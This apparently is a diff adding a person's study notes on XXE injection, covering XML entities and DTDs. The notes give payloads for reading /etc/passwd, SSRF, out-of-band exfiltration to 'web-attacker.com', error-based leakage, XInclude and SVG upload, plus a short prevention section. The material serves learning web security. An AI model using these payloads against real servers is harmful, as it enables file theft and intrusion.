@@ -1,0 +1,187 @@
+XXE ( XML External Entity Injection)
+-------------------------------------
+
+* We should learn some basics of the XML first.
+
+* Some back end applications use XML format to transmit data.
+* XXE vulnerabilities arise specific XML specifications contain various potentially dangerous features.
+
+* XML = Extensible markup language
+* Tree structure
+* No predefined tags
+* The "X" in "AJAX" stands for XML
+
+XML Entities
+--------------
+
+* XML entities are a way of representing an item of data within an XML document instead of using the data itself.
+* For example, &lt; and &gt; represents the characters < and > respectively. These are metacharacters used to denote XML tags.
+
+* There are some predefined entities.
+-> `&lt;` represents `<`
+-> `&gt;` represents `>`
+-> `&amp;` represents `&`
+-> `&quot;` represents `"`
+-> `&apos;` represents `'`
+
+Document Type Definition ( DTD )
+---------------------------------
+
+* DTD contains declarations that can define the structure of an XML document, the types of data values it can contain and other items.
+* The DTD is declared with optional "DOCTYPE" element at the start of the XML document.
+* The DTD can be fully self-contained within the document itself ( known as internal DTD )
+* The DTD can be fully loaded from elsewhere ( known as externel DTD )
+* The DTD can be hybrid of external and internal.
+
+XML custom entities
+-------------------
+
+* <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]> 
+* Above definition means any usage of the entity reference &myentitiy; within the XML document will be replaced by the defined value "my entity value".
+
+XML External Entities
+---------------------
+* XML External Entities are a type of custom entity whose definition is located outside of the DTD where they are declared.
+* The declaration of an external entity uses the "SYSTEM" keyword and must specify url or path from which the value of the entity should be loaded. 
+Example:
+-> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>  ( URL )
+-> <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>  ( File path )
+
+
+XXE Injection Attacks
+---------------------
+
+-> To retrieve files
+-> To perform SSRF ( Server Side Request Forgery ) attacks
+-> Blind XXE exfiltrate data oob ( out of band ) 
+-> Blind XXE to retrieve data via error messages
+
+
+
+
+XXE To Retrieve Files
+---------------------
+
+Payload:
+-> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
+
+
+
+XXE to SSRF attacks
+-------------------
+
+Payload:
+-> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/admin"> ]>
+
+
+
+Blind XXE vulnerabilities
+-------------------------
+
+* Similar to SQL injection cases, blind vulnerabilities occur when WEB applications response does not reflect the values required to perform attacks.
+
+* Detection can be done using OOB ( out of band or OAST ) techniques, again very similar to SQL injection.
+Payload:
+-> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://web-attacker.com"> ]>
+* This payload will cause a request to attacker's website, then attacker will be  able to understand the existence of XXE injection.
+* We can use Burp Pro Colloborator for detection purpose using DNS lookup or HTTP request.
+
+
+* Sometimes regular entities are blocked by input validation or parser etc. 
+* To bypass this, we can make use of parameter entities.
+* Parameter entity declarations are slightly different from regular entities in terms of syntac.
+-> <!ENTITY % myparameterentity "my parameter entity value" >
+* They are also referred using percent character instead of the ampersand in the regular case.
+-> %myparameterentity;
+* We can make use of it for OOB purposes.
+
+
+How to exfiltrate data oob? ( Exploitation of Blind XXE vulnerabilities )
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+* The attacker should host below payload. 
+* IMPORTANT: It is not an injection payload. 
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
+
+* Assume the payload is hosted on the http://Alkim.com
+* The payload is very easy to understand. &#x25; is the percent sign unicode encoded.
+
+* Injection payload is as always.
+-> <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://Alkim.com"> %xxe;]>
+
+* This will cause server to include the DTD defined in hacker hosted server.
+
+NOTE: This technique might not work with some file contents, including the newline characters containted in the /etc/passwd file. File such as /etc/hostname may be more useful for those cases.
+
+How to retrieve data via error messages?
+- - - - - - - - - - - - - - - - - - - - -
+
+* This time following payload will be used.
+ 
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+* There will be error since the URL will belong to a nonexistent file.
+
+NOTE: BLind XXE can be exploited by repurposing a local DTD.
+
+The payload:
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
+* Custom entitiy is overwritten.
+
+XInclude Attacks
+----------------
+
+Payload:
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/>
+
+* This payload can be located anywhere in the XML document.
+
+
+XXE via file upload
+-------------------
+
+* Example of XML-based file formats: DOCX, SVG...
+
+Payload:
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+		<text font-size="16" x="0" y="16">&xxe;</text>
+	</svg>
+
+* We make use of "<text>" tag to see the result.
+
+XXE attacks via modified content type
+-------------------------------------
+
+* Most HTTP POST requests use a default content type that is generated by HTML forms such as  application/x-www-form-urlencoded. Some websites will tolarete other types such as XML.
+
+* If the application tolarets XML messages in the body, we can reach some hidden XEE injection attack surface.
+
+XXE PREVENTION
+--------------
+
+* We need to disable some features of the XML parses.
+-> Resolution of external entities / DTD declarations
+-> Support of XInclude
